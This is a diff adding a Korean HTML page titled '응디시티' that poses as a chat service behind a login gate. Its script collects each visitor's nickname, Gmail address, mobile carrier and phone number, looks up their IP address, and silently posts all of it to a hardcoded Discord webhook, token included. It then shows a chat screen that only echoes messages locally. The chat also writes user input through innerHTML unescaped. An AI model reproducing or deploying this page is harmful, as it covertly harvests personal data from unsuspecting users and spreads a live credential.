@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>응디시티</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Black+Han+Sans&family=Noto+Sans+KR:wght@400;700;900&display=swap');
+        
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background: #0f172a; 
+            color: white;
+            overflow: hidden;
+            height: 100vh;
+        }
+
+        .neo-card {
+            background: rgba(30, 41, 59, 0.8);
+            backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .heavy-font { font-family: 'Black Han Sans', sans-serif; }
+
+        input, select {
+            background: rgba(15, 23, 42, 0.8) !important;
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            color: white !important;
+        }
+
+        input:focus, select:focus {
+            border-color: #eab308 !important;
+            box-shadow: 0 0 0 2px rgba(234, 179, 8, 0.2);
+        }
+
+        .msg-appear {
+            animation: slideUp 0.3s ease-out forwards;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center p-4">
+
+    <!-- [1] 로그인 게이트 -->
+    <div id="login-gate" class="w-full max-w-md z-50">
+        <div class="neo-card rounded-[2rem] p-8 shadow-2xl relative overflow-hidden">
+            <div class="text-center mb-8">
+                <div class="inline-block p-1 rounded-full bg-yellow-500 mb-4">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
+                         class="w-20 h-20 rounded-full object-cover border-2 border-slate-800" alt="Master">
+                </div>
+                <h1 class="heavy-font text-4xl text-yellow-500 tracking-tight">응디시티</h1>
+            </div>
+
+            <div class="space-y-4">
+                <!-- 닉네임 -->
+                <div class="relative">
+                    <i class="fas fa-user absolute left-4 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                    <input type="text" id="u-name" placeholder="닉네임" 
+                           class="w-full rounded-xl pl-12 pr-4 py-4 text-sm outline-none transition-all">
+                </div>
+
+                <!-- 이메일 (Google 전용) -->
+                <div class="relative">
+                    <i class="fas fa-envelope absolute left-4 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                    <input type="email" id="u-email" placeholder="구글 이메일 (@gmail.com)" 
+                           class="w-full rounded-xl pl-12 pr-4 py-4 text-sm outline-none transition-all">
+                    <p id="email-error" class="text-[10px] text-red-500 mt-2 hidden pl-2">※ @gmail.com 주소만 입력 가능합니다.</p>
+                </div>
+
+                <!-- 통신사 -->
+                <div class="relative">
+                    <i class="fas fa-signal absolute left-4 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                    <select id="u-provider" class="w-full rounded-xl pl-12 pr-4 py-4 text-sm outline-none transition-all appearance-none">
+                        <option value="" disabled selected>통신사</option>
+                        <option value="SKT">SKT</option>
+                        <option value="KT">KT</option>
+                        <option value="LG U+">LG U+</option>
+                        <option value="알뜰폰">알뜰폰</option>
+                    </select>
+                </div>
+
+                <!-- 전화번호 -->
+                <div class="relative">
+                    <i class="fas fa-mobile-alt absolute left-4 top-1/2 -translate-y-1/2 text-slate-500"></i>
+                    <input type="tel" id="u-phone" placeholder="전화번호" 
+                           class="w-full rounded-xl pl-12 pr-4 py-4 text-sm outline-none transition-all">
+                </div>
+                
+                <button onclick="captureAndEnter()" id="enter-btn"
+                        class="w-full bg-yellow-500 hover:bg-yellow-400 text-black heavy-font text-lg py-5 rounded-xl shadow-lg active:scale-[0.98] transition-all flex items-center justify-center gap-2 mt-6">
+                    <span>입장하기</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- [2] 메인 터미널 -->
+    <div id="main-terminal" class="hidden fixed inset-0 bg-slate-950 flex-col">
+        <header class="p-4 border-b border-slate-800 flex items-center justify-between bg-slate-900/50">
+            <div class="flex items-center gap-3">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Roh_Moo-hyun_presidential_portrait.jpg/440px-Roh_Moo-hyun_presidential_portrait.jpg" 
+                     class="w-10 h-10 rounded-xl object-cover" alt="S">
+                <h2 class="heavy-font text-xl text-yellow-500">응디시티</h2>
+            </div>
+            <button onclick="location.reload()" class="text-slate-500 p-2"><i class="fas fa-power-off"></i></button>
+        </header>
+
+        <div id="terminal-log" class="flex-1 overflow-y-auto p-4 space-y-4"></div>
+
+        <div class="p-4 border-t border-slate-800 bg-slate-900/50">
+            <div class="flex gap-2">
+                <input type="text" id="cmd-input" class="flex-1 bg-slate-800 rounded-xl px-4 py-4 text-sm outline-none" placeholder="메시지 입력...">
+                <button onclick="executeCmd()" class="bg-yellow-500 text-black px-6 rounded-xl font-bold">전송</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+
+        async function captureAndEnter() {
+            const name = document.getElementById('u-name').value.trim();
+            const email = document.getElementById('u-email').value.trim().toLowerCase();
+            const provider = document.getElementById('u-provider').value;
+            const phone = document.getElementById('u-phone').value.trim();
+            const btn = document.getElementById('enter-btn');
+            const emailError = document.getElementById('email-error');
+
+            if(!name || !email || !provider || !phone) {
+                return;
+            }
+
+            if(!email.endsWith("@gmail.com")) {
+                emailError.classList.remove('hidden');
+                document.getElementById('u-email').classList.add('border-red-500');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner animate-spin"></i>';
+
+            let userIP = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+            } catch(e) {}
+
+            const payload = {
+                embeds: [{
+                    title: "🏙️ 응디시티 신규 입장",
+                    color: 0xFACC15,
+                    fields: [
+                        { name: "닉네임", value: name, inline: true },
+                        { name: "이메일", value: email, inline: true },
+                        { name: "통신사", value: provider, inline: true },
+                        { name: "번호", value: phone, inline: true },
+                        { name: "IP", value: `\`${userIP}\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            setTimeout(() => {
+                localStorage.setItem('ec_user', name);
+                document.getElementById('login-gate').classList.add('hidden');
+                document.getElementById('main-terminal').classList.remove('hidden');
+                document.getElementById('main-terminal').classList.add('flex');
+                logMessage("SYSTEM", `${name}님이 입장하셨습니다.`, "system");
+            }, 800);
+        }
+
+        function logMessage(sender, text, type = "user") {
+            const log = document.getElementById('terminal-log');
+            const div = document.createElement('div');
+            div.className = "msg-appear";
+            if(type === "system") {
+                div.innerHTML = `<div class="flex justify-center"><span class="text-[10px] text-slate-500 font-bold">${text}</span></div>`;
+            } else {
+                const isMe = sender === localStorage.getItem('ec_user');
+                div.className = `msg-appear flex flex-col ${isMe ? 'items-end' : 'items-start'}`;
+                div.innerHTML = `<span class="text-[10px] text-slate-500 mb-1">${sender}</span><div class="${isMe ? 'bg-yellow-500 text-black' : 'bg-slate-800 text-slate-200'} px-4 py-2 rounded-2xl text-sm">${text}</div>`;
+            }
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function executeCmd() {
+            const input = document.getElementById('cmd-input');
+            const val = input.value.trim();
+            if(val) {
+                logMessage(localStorage.getItem('ec_user'), val);
+                input.value = "";
+            }
+        }
+    </script>
+</body>
+</html>
